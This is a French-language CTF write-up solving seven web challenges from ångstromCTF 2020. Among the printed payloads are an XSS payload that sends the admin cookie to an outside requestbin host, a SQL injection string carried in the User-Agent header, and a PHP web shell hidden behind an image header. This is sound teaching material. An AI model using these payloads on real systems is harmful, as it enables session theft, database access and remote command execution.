---
title: ångstromCTF 2020
excerpt: Solutions des challenges web du Angstrom CTF 2020
tags: [CTF, Angstrom, writeup, web]
categories: Write-ups
---

# Web 
## The Magic Word
> **DESCRIPTION**: [Ask and you shall receive](https://magicword.2020.chall.actf.co/)...that is as long as you use the magic word.  
>

On tombe sur une page statique avec le message "give flag".
![Challenge](/img/angstrom_2020_magic_word.png){: .center-image}
Dans ce premier challenge, rien de très compliqué. On affiche les sources de la page affiché. Et on tombe sur le script Javascript suivant: 
```javascript
var msg = document.getElementById("magic");
setInterval(function() {
    if (magic.innerText == "please give flag") {
        fetch("/flag?msg=" + encodeURIComponent(msg.innerText))
            .then(res => res.text())
            .then(txt => magic.innerText = txt.split``.map(v => String.fromCharCode(v.charCodeAt(0) ^ 0xf)).join``);
    }
}, 1000);
```
Si la balise <p> avec l'id "magic" contient la texte "please give flag", ce dernier va être affiché.
On inspecte l'élément, on change la valeur de contenu dans la balise avec l'id "magic". Et le flag apparaît.
![Challenge](/img/angstrom_2020_magic_word_flag.png){: .center-image}

## Xmas Still Stands
> **DESCRIPTION**: You remember when I said I dropped clam's tables? Well that was on Xmas day. And because I ruined his Xmas, he created the [Anti Xmas Warriors](https://xmas.2020.chall.actf.co/) to try to ruin everybody's Xmas. Despite his best efforts, Xmas Still Stands. But, he did manage to get a flag and put it on his site. Can you get it?

Nous sommes redirigés vers un site visant à détruire Noël! Le site est composé de **4** onglets:
* **Home** -> Un simple message expliquant l'intérêt du site
* **Post** -> Une zone de texte permettant de donner des idées sur comment ruiner Noël
* **Report** -> Ici, nous pouvons renseigner l'ID d'un post à un administrateur afin qu'il aille en vérifier son contenu
* **Admin** -> Page d'administration inaccessible sans le cookie administrateur

Tout de suite, je pense à une XSS où il va falloir voler le cookie de l'administrateur. Pour ce faire, il faut trouver où est situé la XSS. Avec un simple payload `<img src=x onerror=alert('XSS');>` dans la zone de texte de l'onglet **Post**.  

![Challenge](/img/angstrom_2020_xmas_xss.png){: .center-image}
Sans surprise, l'alert apparaît.

Pour récupérer le cookie, il va falloir un hook sur lequel effectuer une requête contenant le cookie de l'administrateur. Pour cela, j'ai utilisé [requestbin](http://requestbin.net/).  
Le payload est triviale : `<img src=x onerror="this.src='http://requestbin.net/r/xxxxxxxx/?'+document.cookie; this.removeAttribute('onerror');">`.  
Une fois le post envoyé, on récupère son ID et on la renseigne dans l'onglet **Report** afin qu'un administrateur vienne jeter un œil à notre post. On attend quelques secondes et une requête est effectuée sur notre hook, avec dans l'URL, le **nom** et la **valeur** du cookie.  

![Challenge](/img/angstrom_2020_xmas_get.png){: .center-image}

Il ne reste plus qu'à renseigner ce cookie dans notre navigateur et d'essayer d'accéder à la section **Admin**.
Et voilà!  

![Challenge](/img/angstrom_2020_xmas_flag.png){: .center-image}

Flag `actf{s4n1tize_y0ur_html_4nd_y0ur_h4nds}`

## Consolation
> **DESCRIPTION**: I've been feeling down lately... [Cheer me up!](https://consolation.2020.chall.actf.co/)

Sur ce challenge, on arrive sur une page avec un bouton et un compteur de $. Lorsque l'on clique sur le bouton, le compteur est incrémenté de 25$. Lorsque j'ai inspecté la page, j'ai vu l'existence d'un script [iftenmillionfireflies.js](https://consolation.2020.chall.actf.co/iftenmillionfireflies.js) qui est totalement obfusqué.
![Challenge](/img/angstrom_2020_consolation.png){: .center-image}
J'ai d'abord cru qu'il fallait "déobfusquer" le script afin de comprendre son fonctionnement. Grâce à ça, j'ai découvert beaucoup de choses, mais qui au final était juste là pour brouiller les pistes!

Lorsque je faisais des tests dans la console afin de vérifier le contenu de certaines variables, j'ai cliqué sur le bouton et la console s'est effacé! C'est à ce moment-là que j'ai compris qu'il fallait creuser comprendre pourquoi clear la console à chaque clique sur le bouton. En faisant une recherche du mot-clé `clear` dans le script JS obfusqué, j'ai trouvé cette instruction, qui est la cause du clear de la console lors d'un clique sur le bouton.
![Challenge](/img/angstrom_2020_consolation_clear.png){: .center-image}

J'ai téléchargé le script JS et la page HTML en local et j'ai supprimé l'instruction `console['clear']();`, j'ai cliqué sur le bouton et TA-DA!  

![Challenge](/img/angstrom_2020_consolation_flag.png){: .center-image}

Flag `actf{you_would_n0t_beli3ve_your_eyes}`

## Git Good
> **DESCRIPTION**: Did you know that angstrom has a git repo for all the challenges? I noticed that clam committed [a very work in progress challenge](https://gitgood.2020.chall.actf.co/) so I thought it was worth sharing.

On arrive sur une page statique avec le message "Hello, world!" affiché. En effectuant des recherches classiques '/robots.txt', '/.git', etc. Je n'ai rien trouvé d'intéressant, j'ai également essayé de lister les répertoires avec `gobuster`, sans succès non plus. J'ai fini par essayer l'outil [dirsearch](https://github.com/maurosoria/dirsearch) qui a eu plus de succès !
```
$ python dirsearch.py -u https://gitgood.2020.chall.actf.co -e * -b
[21:55:29] 200 -   15B  - /.git/COMMIT_EDITMSG
[21:55:29] 200 -   92B  - /.git/config
[21:55:29] 200 -   23B  - /.git/HEAD
[21:55:29] 200 -   73B  - /.git/**description**
[21:55:29] 200 -  537B  - /.git/index
[21:55:29] 200 -  240B  - /.git/info/exclude
[21:55:29] 200 -  353B  - /.git/logs/HEAD
[21:55:29] 301 -  195B  - /.git/logs/refs  ->  /.git/logs/refs/
[21:55:29] 301 -  207B  - /.git/logs/refs/heads  ->  /.git/logs/refs/heads/
[21:55:29] 200 -  353B  - /.git/logs/refs/heads/master
[21:55:29] 301 -  197B  - /.git/refs/heads  ->  /.git/refs/heads/
[21:55:29] 200 -   41B  - /.git/refs/heads/master
```
Finalement, nous n'avons pas accès au répertoire '.git' mais il est possible d'avoir accès à tous les fichiers contenu dans ce répertoire.  
Le script n'a pas trouvé tous les fichiers, car il manque le répertoire 'objects' caractéristiques de la structure du répertoire '.git'.  
Pour extraire l'ensemble des fichiers contenu dans le répertoire '.git', j'ai utiliser l'outil `gitdumper`:
```
$ bash gitdumper.sh https://gitgood.2020.chall.actf.co/.git/ clone
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########


[*] Destination folder does not exist
[+] Creating tmp/.git/
[+] Downloaded: HEAD
[+] Downloaded: objects/info/packs
[+] Downloaded: **description**
[+] Downloaded: config
[+] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[-] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[+] Downloaded: info/refs
[+] Downloaded: info/exclude
[+] Downloaded: objects/e9/75d678f209da09fff763cd297a6ed8dd77bb35
[-] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/6b/3c94c0b90a897f246f0f32dec3f5fd3e40abb5
[+] Downloaded: objects/94/02d143d3d7998247c95597b63598ce941e7bcb
[+] Downloaded: objects/b6/30430d9d393a6b143af2839fd24ac2118dba79
[+] Downloaded: objects/c2/658d7d1b31848c3b71960543cb0368e56cd4c7
[+] Downloaded: objects/63/8887a54973265c428cd51ce6dfd48f196d91c4
[+] Downloaded: objects/49/b319c37dc674bca682cab0f2506473dda6bd9a
[+] Downloaded: objects/78/9fa5caf452f5f6f25bfa9b1c0ab1d593dce1b3
[+] Downloaded: objects/8f/08af35205d0ba80e94b4f4306311039d62e138
[+] Downloaded: objects/24/7c9d491c0d2d6da5e93afcd0681b3edd7ccd70
[+] Downloaded: objects/0f/52598006f9cdb21db2f4c8d44d70535630289b

$ cd clone
$ git status
On branch master
Changes not staged for commit:
  (use "git add/rm <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
	deleted:    .gitignore
	deleted:    index.html
	deleted:    index.js
	deleted:    package-lock.json
	deleted:    package.json
	deleted:    thisistheflag.txt
```
Maintenant que le repo est en local, il est possible d'interagir avec les commandes git classiques.  
On remarque le fichier supprimé 'thisistheflag.txt', avec la commande `git checkout --` on restaure le fichier pour le lire. 
```
$ git checkout -- thisistheflag.txt
$ cat thisistheflag.txt
There used to be a flag here...
```
On comprend donc qu'il faut remonter à un commit antérieur pour lire le flag précédemment renseigné.
Avec `git log`, on énumère tous les commits de la branche master. Et on trouve un seul commit avant celui actuel:
```
$ git log
commit e975d678f209da09fff763cd297a6ed8dd77bb35 (HEAD -> master)
Author: aplet123 <noneof@your.business>
Date:   Sat Mar 7 16:27:44 2020 +0000

    Initial commit

commit 6b3c94c0b90a897f246f0f32dec3f5fd3e40abb5
Author: aplet123 <noneof@your.business>
Date:   Sat Mar 7 16:27:24 2020 +0000

    haha I lied this is the actual initial commit
```
Avec la commande `git reset --hard <hash_commit>`, on repositionne la tête de la branche sur le commit qui nous intéresse. Une fois sur le bon commit, il ne reste plus qu'a afficher le flag!
```
$ git reset --hard 6b3c94c0b90a897f246f0f32dec3f5fd3e40abb5
$ cat thisistheflag.txt
actf{b3_car3ful_wh4t_y0u_s3rve_wi7h}

btw this isn't the actual git server
```

Flag: `actf{b3_car3ful_wh4t_y0u_s3rve_wi7h}`

## Secret Agents
> **DESCRIPTION**: Can you enter [the secret agent portal](https://agents.2020.chall.actf.co/)? I've heard someone has a flag :eyes:
>
>Our insider leaked [the source](https://files.actf.co/b8ec533304b09d0100428d372d8392ba4f798bded442038e045334266d758b29/app.py), but was "terminated" shortly thereafter...

On nous fournit les sources du site, et on repère assez facilement qu'une injection SQL est possible à partir du champ **User-Agent**.
```python
from flask import Flask, render_template, request

from .secret import host, user, passwd, dbname

import mysql.connector

dbconfig = {
	"host":host,
	"user":user,
	"passwd":passwd,
	"database":dbname
}

app = Flask(__name__)

@app.route("/")
def index():
	return render_template("index.html")


@app.route("/login")
def login():
	u = request.headers.get("User-Agent")

	conn = mysql.connector.connect(pool_name="poolofagents",
					pool_size=16,
					**dbconfig)

	cursor = conn.cursor()

	for r in cursor.execute("SELECT * FROM Agents WHERE UA='%s'"%(u), multi=True):
		if r.with_rows:
			res = r.fetchall()
			conn.close()
			break



	if len(res) == 0:
		return render_template("login.html", msg="stop! you're not allowed in here >:)")

	if len(res) > 1:
		return render_template("login.html", msg="hey! close, but no bananananananananana!!!! (there are many secret agents of course)")


	return render_template("login.html", msg="Welcome, %s"%(res[0][0]))

if __name__ == '__main__':
	app.run('0.0.0.0')
```
La *difficulté* est qu'il faut que le résultat de la requête comporte plus d'un résultat. Ce que nous permet de faire le payload suivant: ```'OR 1 LIMIT 2,1 #```  

![Challenge](/img/angstrom_2020_agent_flag.png){: .center-image}

Flag `actf{nyoom_1_4m_sp33d}`

## Defund's Crypt
> **DESCRIPTION**: One year since defund's descent. One crypt. One void to fill. Clam must do it, [and so must you](https://crypt.2020.chall.actf.co/).

On est redirigé vers une page nous proposant d'upload une image.  
Lorsque j'ai inspecté la page, il est indiqué que les sources de la page se situe sur **/src** et que la flag est contenu dans le fichier **/flag.txt** sur le filesystem.
```html
<!-- Defund was a big fan of open source so head over to /src.php -->
<!-- Also I have a flag in the filesystem at /flag.txt but too bad you can't read it -->
<h1>Defund's Crypt<span class="small">o</span></h1>
<p>You must leave behind a memory lest you be forgotten forever.</p>        <img src="crypt.jpg" height="300"/>
<form method="POST" action="/" autocomplete="off" spellcheck="false" enctype="multipart/form-data">
    <p>Leave a memory:</p>
    <input type="file" id="imgfile" name="imgfile">
    <label for="imgfile" id="imglbl">Choose an image...</label>
    <input type="submit" value="Descend">
</form>
<script>
    imgfile.oninput = _ => {
        imgfile.classList.add("satisfied");
        imglbl.innerText = imgfile.files[0].name;
    };
</script>
```

Le code source de la page d'accueil est ci-dessous:
```php
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width,initial-scale=1">
        <link href="https://fonts.googleapis.com/css?family=Inconsolata|Special+Elite&display=swap" rel="stylesheet">
        <link rel="stylesheet" href="/style.css">
        <title>Defund's Crypt</title>
    </head>
    <body>
        <!-- Defund was a big fan of open source so head over to /src.php -->
        <!-- Also I have a flag in the filesystem at /flag.txt but too bad you can't read it -->
        <h1>Defund's Crypt<span class="small">o</span></h1>
        <?php
            if ($_SERVER["REQUEST_METHOD"] === "POST") {
                // I just copy pasted this from the PHP site then modified it a bit
                // I'm not gonna put myself through the hell of learning PHP to write one lousy angstrom chall
                try {
                    if (
                        !isset($_FILES['imgfile']['error']) ||
                        is_array($_FILES['imgfile']['error'])
                    ) {
                        throw new RuntimeException('The crypt rejects you.');
                    }
                    switch ($_FILES['imgfile']['error']) {
                        case UPLOAD_ERR_OK:
                            break;
                        case UPLOAD_ERR_NO_FILE:
                            throw new RuntimeException('You must leave behind a memory lest you be forgotten forever.');
                        case UPLOAD_ERR_INI_SIZE:
                        case UPLOAD_ERR_FORM_SIZE:
                            throw new RuntimeException('People can only remember so much.');
                        default:
                            throw new RuntimeException('The crypt rejects you.');
                    }
                    if ($_FILES['imgfile']['size'] > 1000000) {
                        throw new RuntimeException('People can only remember so much..');
                    }
                    $finfo = new finfo(FILEINFO_MIME_TYPE);
                    if (false === $ext = array_search(
                        $finfo->file($_FILES['imgfile']['tmp_name']),
                        array(
                            '.jpg' => 'image/jpeg',
                            '.png' => 'image/png',
                            '.bmp' => 'image/bmp',
                        ),
                        true
                    )) {
                        throw new RuntimeException("Your memory isn't picturesque enough to be remembered.");
                    }
                    if (strpos($_FILES["imgfile"]["name"], $ext) === false) {
                        throw new RuntimeException("The name of your memory doesn't seem to match its content.");
                    }
                    $bname = basename($_FILES["imgfile"]["name"]);
                    $fname = sprintf("%s%s", sha1_file($_FILES["imgfile"]["tmp_name"]), substr($bname, strpos($bname, ".")));
                    if (!move_uploaded_file(
                        $_FILES['imgfile']['tmp_name'],
                        "./memories/" . $fname
                    )) {
                        throw new RuntimeException('Your memory failed to be remembered.');
                    }
                    http_response_code(301);
                    header("Location: /memories/" . $fname);
                } catch (RuntimeException $e) {
                    echo "<p>" . $e->getMessage() . "</p>";
                }
            }
        ?>
        <img src="crypt.jpg" height="300"/>
        <form method="POST" action="/" autocomplete="off" spellcheck="false" enctype="multipart/form-data">
            <p>Leave a memory:</p>
            <input type="file" id="imgfile" name="imgfile">
            <label for="imgfile" id="imglbl">Choose an image...</label>
            <input type="submit" value="Descend">
        </form>
        <script>
            imgfile.oninput = _ => {
                imgfile.classList.add("satisfied");
                imglbl.innerText = imgfile.files[0].name;
            };
        </script>
    </body>
</html>
```
En gros, lors d'un upload de fichier, il check si c'est un fichier de type .png, .jpg ou .bmp avec la fonction `finfo_file` de PHP. Il check également que l'extension du fichier correspond bien au type retourné par la fonction `finfo_file`. À partir de là, on suppose qu'il va falloir injecté un script PHP camouflé dans une image, car la fonction `finfo_file` va vérifier le header du fichier pour déterminer son type.
Pour cela, j'ai simplement pris une image qui traînais dans mes fichiers, j'ai supprimé tout le contenu afin de ne garder que le header, et j'ai ensuite renseigné le script PHP ci-dessous:
```php
<?php
    echo system($_GET['command']);
?>
```
Avec ce script, je suis capable d'exécuter n'importe quelle commande sur le filesystem en utilisant la paramètre `?commande=<command>` lors d'une requête.  

![Challenge](/img/angstrom_2020_crypt.png){: .center-image}

FLAG: `actf{th3_ch4ll3ng3_h4s_f4ll3n_but_th3_crypt_rem4ins}`

## Woooosh
> **DESCRIPTION**: Clam's tired of people hacking his sites so he spammed obfuscation on his [new game](https://woooosh.2020.chall.actf.co/). I have a feeling that behind that wall of obfuscated javascript there's still a vulnerable site though. Can you get enough points to get the flag? I also found the [backend source](https://files.actf.co/188f275d11eb621ad7308044f1af1bcbddc353335773e9201b4af88d9306b745/index.js).
>
> Second instance: [https://wooooosh.2020.chall.actf.co/](https://wooooosh.2020.chall.actf.co/)

Dans ce challenge, on doit réussir à marquer plus de 20 points sur le jeu. Le but étant de parvenir à trouver le cercle au milieu d'un amas de carré le plus de fois possible dans un temps imparti.  

![Challenge](/img/angstrom_2020_woosh.png){: .center-image}
Le Javascript étant obfusqué, les sources nous sont fournis dans l'énoncé du challenge.
```javascript
const express = require("express");
const exphbs = require("express-handlebars");
const socket = require("socket.io");
const path = require("path");
const http = require("http");
const morgan = require("morgan");

const app = express();
const serv = http.createServer(app);
const io = socket.listen(serv);
const port = process.env.PORT || 60600;

function rand(bound) {
    return Math.floor(Math.random() * bound);
}

function genId() {
    const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
    return new Array(64).fill(0).map(v => chars[rand(chars.length)]).join``;
}

function genShapes() {
    return new Array(20).fill(0).map(v => ({ x: rand(500), y: rand(300) }));
}

function dist(a, b, c, d) {
    return Math.sqrt(Math.pow(c - a, 2), Math.pow(d - b, 2));
}

app.use(morgan("combined"));

app.use(express.static(path.join(__dirname, "public")));

const hbs = exphbs.create({
    extname: ".hbs",
    helpers: {}
});

app.engine("hbs", hbs.engine);
app.set("view engine", "hbs");
app.set("views", path.join(__dirname, "views"));

io.on("connection", client => {
    console.info(`Client connected [id=${client.id}]`)
    let game;
    setTimeout(function() {
        try {
            client.disconnect();
        } catch (err) {
            console.log("err", err);
        }
    }, 1 * 60 * 1000);
    function endGame() {
        try {
            if (game) {
                if (game.score > 20) {
                    client.emit(
                        "disp",
                        `Good job! You're so good at this! The flag is ${process.env.FLAG}!`
                    );
                } else {
                    client.emit(
                        "disp",
                        "Wow you're terrible at this! No flag for you!"
                    );
                }
                game = null;
            }
        } catch (err) {
            console.log("err", err);
        }
    }
    client.on("start", function() {
        try {
            console.info("Start message receive")
            if (game) {
                client.emit("disp", "Game already started.");
            } else {
                game = {
                    shapes: genShapes(),
                    score: 0
                };
                game.int = setTimeout(endGame, 10000);
                client.emit("shapes", game.shapes);
                client.emit("score", 0);
            }
        } catch (err) {
            console.log("err", err);
        }
    });
    client.on("click", function(x, y) {
        try {
            if (!game) {
                return;
            }
            if (typeof x != "number" || typeof y != "number") {
                return;
            }
            if (dist(game.shapes[0].x, game.shapes[1].y, x, y) < 10) {
                game.score++;
            }
            game.shapes = genShapes();
            client.emit("shapes", game.shapes);
            client.emit("score", game.score);
        } catch (err) {
            console.log("err", err);
        }
    });
    client.on("disconnect", function() {
        try {
            if (game) {
                clearTimeout(game.int);
            }
            game = null;
        } catch (err) {
            console.log("err", err);
        }
    });
});

app.get("/", function(req, res) {
    res.render("home");
});

serv.listen(port, function() {
    console.log(`Server listening on port ${port}!`);
});
```
Dans un premier temps, on remarque qu'il s'agit d'un serveur [socket.io](https://socket.io). Je suppose déjà qu'il va falloir implémenter un client afin de simuler le comportement attendu (à savoir cliquer sur le cercle).  
Le fonctionnement d'un serveur `socket.io` est assez simple. Il attendu qu'un client se connecte avec `io.on("connection", client => {` pour commencer une session. Ensuite, il va attendre des messages du client pour effectuer certaines actions (avec les `client.on(<action>)`) et il peut également envoyer des messages au client avec `client.emit(<action>, <valeur>)`.  

Lorsqu'un utilisateur va cliquer sur le bouton **Start game** la page web, le socket client va envoyer l'action `start` au serveur. Lors de la réception de ce message, le serveur vérifie si un partie est déjà en cours auquel il demande au client d'afficher le message `Game already started.`. Sinon, il instancie une partie en générant un tableau de formes puis en initialisant le score à 0. Pour finir, il va envoyer toutes ces informations au client pour qu'il affiche les formes et le score.

Lorsqu'un utilisateur effectue un clique dans la zone prévu, le client envoie le message `click` au serveur. Et c'est cette fonction qui va nous intéresser car pour vérifier l'endroit sur lequel à cliquer l'utilisateur correspond bien à la position du cercle il comprare la position envoyé et la position des premier éléments du tableau de formes. Cela signifie donc que les positions du cercle seront toujours dans l'index `0` et `1` du tableau `game.shapes`.
```javascript
if (dist(game.shapes[0].x, game.shapes[1].y, x, y) < 10) {
    game.score++;
}
```
Avec cette information, on peut facilement créer un client socket.io pour qu'à chaque fois qu'il reçoit message `shapes` avec comme valeur le tableau de forme, il renvoie un message `click` au serveur avec comme valeur les valeurs contenu dans l'index `1` et `0` du tableau reçu.

Voici le script final:
```javascript
const
    io = require("socket.io-client"),
    ioClient = io.connect("https://woooosh.2020.chall.actf.co/");

ioClient.emit("start");

ioClient.on("shapes", function(shapes) {
    try {
        console.log(shapes[0].x, shapes[0].y)
        ioClient.emit("click", shapes[0].x, shapes[0].y)
    } catch (err) {
        console.log("err", err);
    }
});
ioClient.on("score", (msg) => console.info("Score: ", msg))
ioClient.on("disp", (msg) => console.info("Disp", msg))
```

Je oublié de prendre un screenshot et de noter le flag lorsque j'ai lancé le script, car comme les serveur sont situés au US, et que je suis basé en EU, le temps de latence est impressionnant et j'ai seulement le temps de marquer 4 points, alors que sur l'instance européenne déployée par les admins du Angstrom j'ai pu marquer plus de 30 points et donc d'avoir le flag.
